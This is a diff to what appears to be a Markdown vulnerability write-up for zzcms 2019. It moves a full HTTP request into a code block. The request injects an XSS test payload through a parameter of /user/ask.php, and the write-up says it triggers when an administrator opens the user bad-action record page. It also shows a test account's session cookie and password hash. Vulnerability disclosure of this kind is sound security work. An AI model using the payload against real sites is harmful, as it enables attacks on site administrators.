@@ -74,16 +74,19 @@ die ("无效参数");//注意这里不能用js提示
 ![](https://i.imgur.com/H67jYWx.png)
 
 The complete package is as follows
+![](https://i.imgur.com/Fqrmmzf.png)
 
-> GET /user/ask.php?do=modify&page=1&id=1&aaa=<sCrIpT>alert(/xss/)</ScRiPt> HTTP/1.1
-> Host: www.zzcms2019.cc
-> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
-> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-> Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-> Accept-Encoding: gzip, deflate
-> Cookie: __tins__713776=%7B%22sid%22%3A%201551009070949%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201551010962798%7D; __51cke__=; __51laig__=12; bdshare_firstime=1551002231060; PHPSESSID=8o9ms5t57q6dag7ofku75fn2j7; UserName=test; PassWord=e10adc3949ba59abbe56e057f20f883e
-> Connection: keep-alive
-> Upgrade-Insecure-Requests: 1
+```
+GET /user/ask.php?do=modify&page=1&id=1&aaa=<sCrIpT>alert(/xss/)</ScRiPt> HTTP/1.1
+Host: www.zzcms2019.cc
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: __tins__713776=%7B%22sid%22%3A%201551009070949%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201551010962798%7D; __51cke__=; __51laig__=12; bdshare_firstime=1551002231060; PHPSESSID=8o9ms5t57q6dag7ofku75fn2j7; UserName=test; PassWord=e10adc3949ba59abbe56e057f20f883e
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+```
 
 When the administrator accesses the **Users→User Bad Action Record** 
 
